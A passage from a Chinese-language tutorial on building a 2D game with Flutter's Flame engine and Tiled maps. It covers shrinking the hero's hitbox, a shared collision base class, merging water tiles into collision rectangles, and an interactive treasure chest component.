<li><strong>Tile Layer</strong> 的碰撞区完美和地图中 <strong>wall</strong> 图层匹配</li>
<li><strong>Object Layer</strong> 的碰撞区完美和 <strong>Collisions</strong> 对象层匹配</li>
</ul>
<p><strong>在本文素材的前提之下</strong>：</p>
<ul>
<li>如果按 <strong>Tile Layer</strong>，那么碰撞区范围就偏大了，需要你重新绘制墙体，但是你会发现素材中墙体与下面的地板是在一块的，不能分离，这就不太完美。</li>
<li>而 <strong>Object Layer</strong> 可以让我们在不破坏改变墙体的前提下，更精细调整墙体的碰撞区，让它更合理。</li>
</ul>
<p>因此，<strong>各有利弊</strong>，看大家的 <strong>取舍</strong>。</p>
<blockquote>
<p>本文中水面的碰撞区就是 <strong>Tile Layer</strong> 方法，大家可以看一看。</p>
</blockquote>
<h2 data-id="heading-4">MyHero</h2>
<h3 data-id="heading-5">一. 本章目标</h3>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e56f018c6d474c16804a3b03a1eedbc5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=lUsx04BsdQeRssli0UqbPM641lw%3D" width="100%" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca34bafe00f8492b84f46c3022077ae3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=3HTqU0I2VkU8%2Bl9xs2bEEJzpTDs%3D" width="100%" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b0495310526464485e1c9172960dfce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=gCxZLyGeUignUPz%2ByLTpB9cC1zU%3D" width="100%" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7165f8043a14465a8da56a9feef4d515~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=Pj4UfE5HRi3HYs5Q%2FD%2FusulKy58%3D" width="100%" loading="lazy"/>
<h3 data-id="heading-6">二. 人物碰撞矩形优化</h3>
<h4 data-id="heading-7">1. 优化前</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a13610b36e4641518a291fcaf2f9be22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=lQ3u7sKkPYTkAaBs5jQP%2BiK0A3A%3D" alt="1.gif" loading="lazy"/></p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// hero_component.dart</span>

  <span class="hljs-meta">@override</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; onLoad() <span class="hljs-keyword">async</span> {
    ...

    size = Vector2(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>);
    position = Vector2(<span class="hljs-number">1000</span>, <span class="hljs-number">1000</span>);
    _hitbox = RectangleHitbox();
    add(_hitbox);
  }
</code></pre>
<p>默认情况下，人物的碰撞区域 <code>RectangleHitbox</code> 会 <strong>继承父组件的 size</strong>，也就是说碰撞矩形就是  <strong>100×100</strong>，所以碰撞框很大，通常会比人物实际可视部分大。</p>
<blockquote>
<p>这样就导致 <strong>上图中问题</strong> ，在一个狭窄的走道内，由于你的超大碰撞区域，而被卡住。</p>
</blockquote>
<h4 data-id="heading-8">2. 优化后</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee4f4656b4704f9580368f0b4f0ae820~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=pw7jpdIlENx2TjqxTp8HwaXDhyQ%3D" alt="2.gif" loading="lazy"/></p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// hero_component.dart</span>

  <span class="hljs-meta">@override</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; onLoad() <span class="hljs-keyword">async</span> {
    ...

    size = Vector2(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>);
    position = Vector2(<span class="hljs-number">1000</span>, <span class="hljs-number">1000</span>);
    _hitbox = RectangleHitbox.relative(
      Vector2(<span class="hljs-number">0.5</span>, <span class="hljs-number">0.2</span>), <span class="hljs-comment">// 碰撞区域占组件宽高比例</span>
      parentSize: size,
      position: Vector2(size.x * <span class="hljs-number">0.25</span>, size.y * <span class="hljs-number">0.7</span>), <span class="hljs-comment">// 碰撞区域的偏移</span>
    );
    add(_hitbox);
  }
</code></pre>
<p>优化后，我们使用 <code>RectangleHitbox.relative</code> 手动缩小碰撞矩形，并调整偏移，使碰撞区域只覆盖角色脚底，即可获取 <strong>正常的游戏体验</strong>：</p>
<ul>
<li>碰撞矩形与角色可视部分更贴合，避免卡墙。</li>
<li>在狭窄走道中角色可以顺畅移动。</li>
<li>保留足够的碰撞检测区域，保证游戏逻辑和物理交互仍然有效。</li>
</ul>
<blockquote>
<p>✨<strong>总结</strong>：<br/>
通过简单缩小并下移碰撞矩形，实现了视觉与碰撞逻辑的分离，就可以极大提升可控性和玩家体验。</p>
</blockquote>
<h3 data-id="heading-9">三. 统一碰撞管理</h3>
<h4 data-id="heading-10">1. 必要性</h4>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57b3098efea0453b8457509e059ed0a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=ovYDStufGS6Q6oVKItGIHeCR02o%3D" width="100%" loading="lazy"/>
<p>在游戏开发中，墙体、门、障碍区域等 <strong>碰撞对象</strong> 往往分布在地图的不同层级或组件中。<br/>
这类对象的共同特点是：<strong>不一定需要渲染，但必须参与碰撞判断</strong>。</p>
<p>如果每个组件各自实现碰撞逻辑，容易出现以下问题：</p>
<ol>
<li><strong>逻辑分散</strong> ：碰撞判断分布在多个组件中，角色移动与阻挡逻辑难以统一管理。</li>
<li><strong>重复实现</strong>：不同碰撞对象往往需要相同的尺寸、位置和碰撞检测代码，容易产生冗余。</li>
<li><strong>扩展不便</strong>：新增一种可碰撞对象时，需要重复编写或修改现有碰撞相关逻辑。</li>
</ol>
<p>因此，有必要建立一个统一的 <code>碰撞管理</code>，将 <strong>可参与碰撞</strong> 的能力集中管理。</p>
<h4 data-id="heading-11">2. 实现</h4>
<h5 data-id="heading-12">（1）新建碰撞基类</h5>
<p>抽象出一个 <code>BlockerComponent</code> 作为 <strong>统一的碰撞基类</strong>，后续所有需要参与碰撞的组件直接继承该类即可，避免在各个组件中重复编写碰撞逻辑。</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// blocker_component.dart</span>

<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BlockerComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SpriteComponent</span>
    <span class="hljs-title">with</span> <span class="hljs-title">CollisionCallbacks</span> </span>{
  <span class="hljs-keyword">late</span> <span class="hljs-keyword">final</span> RectangleHitbox hitbox;

  BlockerComponent({
    <span class="hljs-keyword">super</span>.position,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">super</span>.size,
    <span class="hljs-built_in">bool</span> addHitbox = <span class="hljs-keyword">true</span>,
  }) {
    <span class="hljs-keyword">if</span> (addHitbox) {
      hitbox = RectangleHitbox();
      add(hitbox);
    }
  }

  <span class="hljs-meta">@override</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; onLoad() <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// 创建 1×1 的透明 sprite，占位以满足 SpriteComponent 要求</span>
    <span class="hljs-keyword">final</span> recorder = PictureRecorder();
    <span class="hljs-keyword">final</span> canvas = Canvas(recorder);
    <span class="hljs-keyword">final</span> paint = Paint()..color = <span class="hljs-keyword">const</span> Color(<span class="hljs-number">0x00000000</span>);
    canvas.drawRect(<span class="hljs-keyword">const</span> Rect.fromLTWH(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), paint);
    <span class="hljs-keyword">final</span> picture = recorder.endRecording();
    <span class="hljs-keyword">final</span> image = <span class="hljs-keyword">await</span> picture.toImage(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);
    sprite = Sprite(image);
  }

  <span class="hljs-built_in">bool</span> collidesWith(Rect heroRect) {
    <span class="hljs-keyword">return</span> hitbox.toAbsoluteRect().overlaps(heroRect);
  }
}
</code></pre>
<ul>
<li>
<p><strong>作为可碰撞组件的基础类</strong></p>
<ul>
<li>继承 <code>SpriteComponent</code>，统一管理位置与尺寸</li>
<li>混入 <code>CollisionCallbacks</code>，接入 Flame 碰撞体系</li>
<li>使用 <code>RectangleHitbox</code> 作为实际的碰撞区域</li>
</ul>
</li>
<li>
<p><strong>解决 SpriteComponent 必须绑定 sprite 的限制</strong></p>
<ul>
<li>在 <code>onLoad</code> 中创建一个 <code>1×1</code> 的透明 sprite</li>
<li>组件本身不可见，但在引擎层面是合法的渲染组件</li>
</ul>
</li>
<li>
<p><strong>提供手动碰撞检测能力</strong></p>
<ul>
<li>通过 <code>collidesWith(Rect heroRect)</code> 判断是否发生重叠</li>
<li>适用于角色移动过程中的阻挡判断与位移修正</li>
</ul>
</li>
</ul>
<h5 data-id="heading-13">（2）修改代码</h5>
<p>首先，我们就可以将原来的 <code>wall_component.dart</code> 继承了 <code>BlockerComponent</code>。</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// wall_component.dart</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WallComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BlockerComponent</span> </span>{
  WallComponent({Vector2? position, <span class="hljs-keyword">required</span> Vector2 size}) 
      : <span class="hljs-keyword">super</span>(position: position, size: size);
}
</code></pre>
<hr/>
<p>其次，在 <code>my_game.dart</code> 中,我们将原来只用于收集墙体的列表修改：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// my_game.dart</span>

<span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;WallComponent&gt; walls  ---&gt;  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;BlockerComponent&gt; blockers

<span class="hljs-comment">// 统一添加管理</span>
blockers.add();
</code></pre>
<hr/>
<p>最后，在 <code>hero_component.dart</code> 中修改：</p>
<ul>
<li><strong>碰撞性能优化集合</strong></li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">final</span> <span class="hljs-built_in">Set</span>&lt;BlockerComponent&gt; _nearbyBlockers = {};
<span class="hljs-keyword">late</span> RectangleHitbox _hitbox;
</code></pre>
<ul>
<li><strong>碰撞检测方法</strong></li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-built_in">bool</span> _wouldCollideWithBlockers() {
    <span class="hljs-keyword">final</span> heroRect = _hitbox.toAbsoluteRect();

    <span class="hljs-comment">// 优先使用游戏维护的 blockers 集合</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> blocker <span class="hljs-keyword">in</span> game.blockers) {
      <span class="hljs-keyword">if</span> (blocker.collidesWith(heroRect)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
    }
    
    ...

    <span class="hljs-comment">// 兼容附近 blockers</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> nearby <span class="hljs-keyword">in</span> _nearbyBlockers) {
      <span class="hljs-keyword">if</span> (nearby.collidesWith(heroRect)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
    }

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
}
</code></pre>
<ul>
<li><strong>碰撞回调</strong></li>
</ul>
<pre><code class="hljs language-dart" lang="dart"> <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> onCollisionStart(
    <span class="hljs-built_in">Set</span>&lt;Vector2&gt; intersectionPoints,
    PositionComponent other,
  ) {
    <span class="hljs-keyword">super</span>.onCollisionStart(intersectionPoints, other);
    <span class="hljs-keyword">if</span> (other <span class="hljs-keyword">is</span> BlockerComponent) {
      _nearbyBlockers.add(other);
    }
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> onCollisionEnd(PositionComponent other) {
    <span class="hljs-keyword">super</span>.onCollisionEnd(other);
    <span class="hljs-keyword">if</span> (other <span class="hljs-keyword">is</span> BlockerComponent) {
      _nearbyBlockers.remove(other);
    }
  }
</code></pre>
<h3 data-id="heading-14">四. Tile Layer 构建水面碰撞区</h3>
<p>构建水面碰撞区，简单来说就是遍历 <strong>Tiled</strong> 地图中的 <code>water</code> 图层，将所有 <strong>非空瓦片</strong> 转换为对应的 <code>WaterComponent</code>，并按瓦片位置和大小添加到游戏世界中，用于表示水面。</p>
<h4 data-id="heading-15">方式一：逐瓦片创建组件（仅展示）</h4>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a896ee7f208345fca1d11b496bd17230~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=%2FkCwsOFjP9AtAdy3RDP6NZ5qIsE%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">final</span> waterLayer = tiled.tileMap.getLayer&lt;TileLayer&gt;(<span class="hljs-string">'water'</span>);

<span class="hljs-keyword">if</span> (waterLayer != <span class="hljs-keyword">null</span> &amp;&amp; waterLayer.data != <span class="hljs-keyword">null</span>) {
  <span class="hljs-keyword">final</span> width = waterLayer.width;
  <span class="hljs-keyword">final</span> height = waterLayer.height;
  <span class="hljs-keyword">final</span> data = waterLayer.data!;

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> y = <span class="hljs-number">0</span>; y &lt; height; y++) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> x = <span class="hljs-number">0</span>; x &lt; width; x++) {
      <span class="hljs-keyword">final</span> index = y * width + x;
      <span class="hljs-keyword">final</span> gid = data[index];

      <span class="hljs-keyword">if</span> (gid != <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">final</span> water = WaterComponent(
            position: Vector2(
              x * tileSize * mapScale,
              y * tileSize * mapScale,
            ),
            size: Vector2(
              tileSize * mapScale,
              tileSize * mapScale,
            ),
          );
        <span class="hljs-comment">// 添加至统一碰撞列表</span>
        blockers.add(water);
        <span class="hljs-keyword">await</span> world.add(water);
      }
    }
  }
}

</code></pre>
<p>这里将地图中每一个 <strong>8x8</strong> 的水瓦片，都单独变成一个 <code>WaterComponent</code> 对象。</p>
<blockquote>
<p>可以看见地图中水面数量巨大，产生了 <strong>大量组件</strong>，<strong>极大降低渲染和碰撞效率</strong>。</p>
</blockquote>
<h4 data-id="heading-16">方式二：批量合并创建组件（推荐）</h4>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/856732f2c2ae42019a8f8586ce6be852~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=ZrolKuefyJzl3uU0noNLYmM02to%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-dart" lang="dart">  <span class="hljs-comment">// my_game.dart</span>

  <span class="hljs-keyword">final</span> waterLayer = tiled.tileMap.getLayer&lt;TileLayer&gt;(<span class="hljs-string">'water'</span>);
    <span class="hljs-keyword">if</span> (waterLayer != <span class="hljs-keyword">null</span> &amp;&amp; waterLayer.data != <span class="hljs-keyword">null</span>) {
      <span class="hljs-keyword">await</span> addMergedTileLayerV2(
        tileData: waterLayer.data!,
        width: waterLayer.width,
        height: waterLayer.height,
        tileSize: tileSize,
        scale: mapScale,
        createComponent: (position, size) <span class="hljs-keyword">async</span> {
          <span class="hljs-keyword">final</span> water = WaterComponent(position: position, size: size);
          <span class="hljs-comment">// 添加至统一碰撞列表</span>
          blockers.add(water);
          <span class="hljs-keyword">return</span> water;
        },
        parent: world,
      );
    }
</code></pre>
<p>这种方式通过 <code>addMergedTileLayerV2</code> 将相邻的水瓦片批量合并为较少的组件:</p>
<ul>
<li>大幅减少 <code>Component</code> 数量，提高性能</li>
<li>保持碰撞逻辑和渲染一致</li>
<li>可以统一加入 <code>blockers</code> 列表，方便英雄碰撞预测</li>
</ul>
<blockquote>
<p>可以看见地图中,数量巨大的组件,经过 <code>addMergedTileLayerV2</code> 方法批量合并后，仅为3个了。</p>
</blockquote>
<h4 data-id="heading-17">批量合并方法</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// common.dart</span>

<span class="hljs-comment">/// <span class="markdown">扫描 TileLayer 数据，将连续非零瓦片合并成矩形组件（水平+垂直合并）</span></span>
<span class="hljs-comment">/// <span class="markdown">[tileData] - TileLayer.data，按行展开</span></span>
<span class="hljs-comment">/// <span class="markdown">[width] - TileLayer 宽度（列数）</span></span>
<span class="hljs-comment">/// <span class="markdown">[height] - TileLayer 高度（行数）</span></span>
<span class="hljs-comment">/// <span class="markdown">[tileSize] - 每个瓦片大小</span></span>
<span class="hljs-comment">/// <span class="markdown">[scale] - 地图缩放</span></span>
<span class="hljs-comment">/// <span class="markdown">[createComponent] - 创建每个碰撞块的方法</span></span>
<span class="hljs-comment">/// <span class="markdown">[parent] - 父组件，用于添加生成的组件</span></span>
Future&lt;<span class="hljs-keyword">void</span>&gt; addMergedTileLayerV2({
  <span class="hljs-keyword">required</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">int</span>&gt; tileData,
  <span class="hljs-keyword">required</span> <span class="hljs-built_in">int</span> width,
  <span class="hljs-keyword">required</span> <span class="hljs-built_in">int</span> height,
  <span class="hljs-keyword">required</span> <span class="hljs-built_in">double</span> tileSize,
  <span class="hljs-built_in">double</span> scale = <span class="hljs-number">1.0</span>,
  <span class="hljs-keyword">required</span> Future&lt;PositionComponent&gt; <span class="hljs-built_in">Function</span>(Vector2 position, Vector2 size)
      createComponent,
  <span class="hljs-keyword">required</span> Component parent,
}) <span class="hljs-keyword">async</span> {
  <span class="hljs-comment">// Step1: 先按行生成水平合并块</span>
  <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">int</span>&gt;&gt; rects = []; <span class="hljs-comment">// 每行的开始列和宽度</span>
  <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">int</span>&gt;&gt; horizontalRects = <span class="hljs-built_in">List</span>.generate(height, (_) =&gt; []);

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> y = <span class="hljs-number">0</span>; y &lt; height; y++) {
    <span class="hljs-built_in">int</span> startX = <span class="hljs-number">-1</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> x = <span class="hljs-number">0</span>; x &lt;= width; x++) {
      <span class="hljs-keyword">final</span> isFilled = x &lt; width &amp;&amp; tileData[y * width + x] != <span class="hljs-number">0</span>;

      <span class="hljs-keyword">if</span> (isFilled &amp;&amp; startX == <span class="hljs-number">-1</span>) {
        startX = x;
      }

      <span class="hljs-keyword">if</span> ((!isFilled || x == width) &amp;&amp; startX != <span class="hljs-number">-1</span>) {
        horizontalRects[y].addAll([startX, x - startX]);
        startX = <span class="hljs-number">-1</span>;
      }
    }
  }

  <span class="hljs-comment">// Step2: 垂直合并相同列和宽度的块</span>
  <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">int</span>&gt;&gt; processed = <span class="hljs-built_in">List</span>.generate(height, (_) =&gt; <span class="hljs-built_in">List</span>.filled(width, <span class="hljs-number">0</span>));
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> y = <span class="hljs-number">0</span>; y &lt; height; y++) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; horizontalRects[y].length; i += <span class="hljs-number">2</span>) {
      <span class="hljs-keyword">final</span> xStart = horizontalRects[y][i];
      <span class="hljs-keyword">final</span> w = horizontalRects[y][i + <span class="hljs-number">1</span>];

      <span class="hljs-keyword">if</span> (processed[y][xStart] == <span class="hljs-number">1</span>) <span class="hljs-keyword">continue</span>;

      <span class="hljs-comment">// 尝试向下合并</span>
      <span class="hljs-built_in">int</span> rectHeight = <span class="hljs-number">1</span>;
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> yy = y + <span class="hljs-number">1</span>; yy &lt; height; yy++) {
        <span class="hljs-built_in">bool</span> canMerge = <span class="hljs-keyword">false</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; horizontalRects[yy].length; j += <span class="hljs-number">2</span>) {
          <span class="hljs-keyword">if</span> (horizontalRects[yy][j] == xStart &amp;&amp;
              horizontalRects[yy][j + <span class="hljs-number">1</span>] == w) {
            canMerge = <span class="hljs-keyword">true</span>;
            <span class="hljs-keyword">break</span>;
          }
        }
        <span class="hljs-keyword">if</span> (canMerge) {
          rectHeight++;
          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> col = xStart; col &lt; xStart + w; col++) {
            processed[yy][col] = <span class="hljs-number">1</span>;
          }
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-keyword">break</span>;
        }
      }

      <span class="hljs-comment">// 创建组件</span>
      <span class="hljs-keyword">final</span> position =
          Vector2(xStart * tileSize * scale, y * tileSize * scale);
      <span class="hljs-keyword">final</span> size = Vector2(w * tileSize * scale, rectHeight * tileSize * scale);
      <span class="hljs-keyword">final</span> block = <span class="hljs-keyword">await</span> createComponent(position, size);
      <span class="hljs-keyword">await</span> parent.add(block);

      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> col = xStart; col &lt; xStart + w; col++) {
        processed[y][col] = <span class="hljs-number">1</span>;
      }
    }
  }
}
</code></pre>
<blockquote>
<p><code>addMergedTileLayerV2</code> 用于 <strong>扫描 TileLayer 的瓦片数据</strong>，将相邻的非空瓦片先进行<strong>水平方向合并</strong>，再在此基础上进行<strong>垂直方向合并</strong>，最终把多个连续瓦片合并为<strong>更大的矩形组件</strong>。</p>
</blockquote>
<h3 data-id="heading-18">五. 宝箱 - 无验证交互式解锁</h3>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e56f018c6d474c16804a3b03a1eedbc5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=lUsx04BsdQeRssli0UqbPM641lw%3D" width="100%" loading="lazy"/>
<h4 data-id="heading-19">1. 简述</h4>
<p><strong>宝箱</strong> 是一种无需条件验证的可交互地图对象，通过角色接触即可触发交互。</p>
<ul>
<li>
<p><strong>继承关系</strong>：无需继承碰撞基类</p>
</li>
<li>
<p><strong>功能</strong>：提供可拾取奖励</p>
</li>
<li>
<p><strong>交互逻辑</strong>：</p>
<ul>
<li>玩家靠近宝箱即可触发打开动作</li>
<li>打开后玩家可选择是否拾取奖励</li>
</ul>
</li>
</ul>
<h4 data-id="heading-20">2. Tiled 前置工作</h4>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f66a0b0d129e4d2cb010490532f8ecc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=E9i88QuVDqSjv3FZkmwwKvefU6M%3D" width="100%" loading="lazy"/>
<ol>
<li>新建 <code>Object Layer</code> 图层，命名为 <code>treasure</code>。</li>
<li>点击使用上方矩形框选工具。</li>
<li>在地图中所需位置，正确绘制宝箱大小的矩形。</li>
<li>添加属性：</li>
</ol>
<ul>
<li>type：<strong>trasure</strong></li>
<li>status：表示 <strong>宝箱状态</strong>，一共有三种：<strong>closed（关闭）</strong>、<strong>full（打开未拿取）</strong>、<strong>enmpty（打开已拿取）</strong></li>
</ul>
<h4 data-id="heading-21">3. 构建宝箱类</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// treasure_component.dart</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TreasureComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SpriteComponent</span>
    <span class="hljs-title">with</span> <span class="hljs-title">HasGameReference</span>&lt;<span class="hljs-title">MyGame</span>&gt;, <span class="hljs-title">CollisionCallbacks</span> </span>{
  <span class="hljs-built_in">String</span> status;
  <span class="hljs-keyword">late</span> RectangleHitbox _hitbox;

  TreasureComponent({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.status,
    <span class="hljs-keyword">required</span> Vector2 position,
    <span class="hljs-keyword">required</span> Vector2 size,
  }) : <span class="hljs-keyword">super</span>(position: position, size: size);

  <span class="hljs-meta">@override</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; onLoad() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-keyword">super</span>.onLoad();

    sprite = <span class="hljs-keyword">await</span> Sprite.load(
      status == <span class="hljs-string">'closed'</span>
          ? <span class="hljs-string">'closed_treasure.png'</span>
          : status == <span class="hljs-string">'full'</span>
              ? <span class="hljs-string">'full_treasure.png'</span>
              : <span class="hljs-string">'empty_treasure.png'</span>,
    );

    _hitbox = RectangleHitbox();
    add(_hitbox);
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> onCollisionStart(
    <span class="hljs-built_in">Set</span>&lt;Vector2&gt; intersectionPoints,
    PositionComponent other,
  ) {
    <span class="hljs-keyword">super</span>.onCollisionStart(intersectionPoints, other);
    <span class="hljs-keyword">if</span> (other <span class="hljs-keyword">is</span> HeroComponent) {
      attemptOpen(other);
    }
  }

  Future&lt;<span class="hljs-keyword">void</span>&gt; _open() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (status == <span class="hljs-string">'closed'</span>) {
      status = <span class="hljs-string">'full'</span>;
      sprite = <span class="hljs-keyword">await</span> Sprite.load(<span class="hljs-string">'full_treasure.png'</span>);
    }
  }

  Future&lt;<span class="hljs-keyword">void</span>&gt; _collect(HeroComponent hero) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (status == <span class="hljs-string">'full'</span>) {
      status = <span class="hljs-string">'empty'</span>;
      sprite = <span class="hljs-keyword">await</span> Sprite.load(<span class="hljs-string">'empty_treasure.png'</span>);
      UiNotify.showToast(game, <span class="hljs-string">'获得宝物'</span>);
    }
  }

  <span class="hljs-keyword">void</span> attemptOpen(HeroComponent hero) {
    <span class="hljs-keyword">if</span> (status == <span class="hljs-string">'closed'</span>) {
      _open();
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (status == <span class="hljs-string">'full'</span>) {
      <span class="hljs-keyword">final</span> exists = game.camera.viewport.children
          .query&lt;DialogComponent&gt;()
          .isNotEmpty;
      <span class="hljs-keyword">if</span> (!exists) {
        <span class="hljs-keyword">final</span> dialog = DialogComponent.confirm(
          message: <span class="hljs-string">'是否拿取宝物'</span>,
          onConfirm: () =&gt; _collect(hero),
          onCancel: () {},
        );
        game.camera.viewport.add(dialog);
      }
    }
  }
}
</code></pre>
<p><code>TreasureComponent</code> 作为宝箱实体类,负责 <strong>显示与交互</strong> 的逻辑：</p>
<ul>
<li>
<p><strong>继承 <code>SpriteComponent</code> + 碰撞回调</strong></p>
<ul>
<li>具备位置、尺寸和碰撞检测能力</li>
</ul>
</li>
<li>
<p><strong>状态管理</strong></p>
<ul>
<li><code>status = closed</code>：关闭状态，触碰后自动打开</li>
<li><code>status = full</code>：已打开状态，弹出对话框确认是否拾取</li>
<li><code>status = empty</code>：已拿取状态，仅显示空宝箱</li>
</ul>
</li>
<li>
<p><strong>视图更新</strong></p>
<ul>
<li>根据宝箱状态动态加载不同贴图</li>
</ul>
</li>
<li>
<p><strong>交互逻辑</strong></p>
<ul>
<li>人物触碰到宝箱区域后，根据当前状态，决定下一步行为</li>
</ul>
</li>
</ul>
<h4 data-id="heading-22">4. 加载宝箱</h4>
<pre><code class="hljs language-dart" lang="dart">    <span class="hljs-comment">// my_game.dart</span>

    <span class="hljs-keyword">final</span> treasureLayer = tiled.tileMap.getLayer&lt;ObjectGroup&gt;(<span class="hljs-string">'treasure'</span>);

    <span class="hljs-keyword">if</span> (treasureLayer != <span class="hljs-keyword">null</span>) {
